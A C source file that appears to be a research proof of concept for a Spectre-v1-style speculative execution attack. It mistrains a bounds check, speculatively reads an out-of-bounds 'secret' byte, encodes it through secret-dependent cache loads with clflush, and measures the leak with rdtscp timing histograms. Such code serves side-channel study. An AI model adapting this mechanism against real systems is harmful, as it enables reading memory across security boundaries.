#include<stdio.h>
#include<time.h>
#include<stdint.h>
#include<string.h>
#ifdef _MSC_VER
#include<intrin.h>
#pragma optimize("gt", on)
#else
#include<x86intrin.h>
#endif

#define N_NUM_1 N[0][0]
#define N_NUM_2 N[N[1][0]][0]
#define N_NUM_3 N[N[N[2][0]][0]][0]
#define N_NUM_INST (N_NUM == 1 ? N_NUM_1 : (N_NUM == 2 ? N_NUM_2 : N_NUM_3))

#define TEST_NUM 2

#define HistMax_1 400
#define HistMax_2 800
#define HistMax_3 1200
#define HistMax (N_NUM == 1 ? HistMax_1 : (N_NUM == 2 ? HistMax_2 : HistMax_3))
const int LoopRound = 2000;


int N[20][16];
int malicious_x = 100;
uint8_t array1[101];
uint8_t p[64 * 5 + 1];
uint8_t Random[TEST_NUM] = {0, 1};
int hist[HistMax + 1][2]; //hist[..][secret=0], hist[..][secret=1]

void maccess(void* p) {
    __asm__ __volatile("movq (%0), %%rax\n"
        :
        :"c"(p)
        :"rax"
    );
}



void getAverage() {
    double ave1, ave2;
    int tot1 = 0, tot2 = 0;

    for(int i = 0; i < HistMax; i++) {
        tot1 += hist[i][0] * i;
        tot2 += hist[i][1] * i;
    }

    ave1 = tot1 * 1.0 / LoopRound;
    ave2 = tot2 * 1.0 / LoopRound;
    printf("%f %f\n", ave1, ave2);
}


int main() {
	#ifdef LOADS_NUM
	#ifdef N_NUM
//	printf("LOADS_NUM = %d, N_NUM = %d\n", LOADS_NUM, N_NUM);

    register int time1, time2;
    unsigned int junk = 0;
	double tot = 0;
	for (int i = 0; i < LoopRound; i++) {
    	time1 = __rdtscp(&junk);
    	time2 = __rdtscp(&junk) - time1;
		tot += time2;
	}
	tot /= LoopRound; 
//	printf("rdtscp: %f\n", tot);

	
    
    N[0][0] = 16;
    for(int i = N_NUM - 1; i > 0; i--) N[i][0] = i - 1;

    array1[1] = 0;
    array1[100] = 1;
    size_t training_x = 1;
    register int x;
    register uint8_t temp;

    for(int l = 0; l < LoopRound; l++) {
        for(int t = 0; t < TEST_NUM; t++) {
            array1[100] = Random[t];
            _mm_mfence();

            for(int i = 5; i >= 0; i--) {
                p[64] = 1;
                for(int j = 0; j < N_NUM; j++) _mm_clflush(&N[j][0]);
                _mm_mfence();
                for(int k = 1; k <= LOADS_NUM; k++) _mm_clflush(&p[64 * k]);
                maccess(&array1[100]); maccess(&p[0]); _mm_mfence();

                x = ((i % 6) - 1) & ~0xFFFF;
                x = (x | (x >> 16));
                x = training_x ^ (x & (malicious_x ^ training_x));
                _mm_mfence();

				_mm_clflush(&junk);

/******************************************************************************/
                time1 = __rdtscp(&junk);
                if(x < N_NUM_INST) {
                    register uint8_t secret = array1[x];

					#if LOADS_NUM >= 1
                    volatile register uint8_t *addr1 = p + secret * 64;
                    register uint8_t temp1 = *addr1;
					#endif

					#if LOADS_NUM >= 2
					volatile register uint8_t *addr2 = p + secret * 128;
                    register uint8_t temp2 = *addr2;
					#endif

					#if LOADS_NUM >= 3
					volatile register uint8_t *addr3 = p + secret * 192;
                    register uint8_t temp3 = *addr3;
					#endif

					#if LOADS_NUM >= 4
					volatile register uint8_t *addr4 = p + secret * 256;
                    register uint8_t temp4 = *addr4;
					#endif

					#if LOADS_NUM >= 5
					volatile register uint8_t *addr5 = p + secret * 320;
                    register uint8_t temp5 = *addr5;
					#endif

                }
                time2 = __rdtscp(&junk) - time1 - (int)tot;
                if(x == 100) {
                    if(time2 < HistMax) 
                        hist[time2][Random[t]]++;
                    else 
                        hist[HistMax - 1][Random[t]]++;
                }
/****************************************************************************/
            }
        }
    }
    getAverage();
	printf("\n");
	#endif
	#endif
}
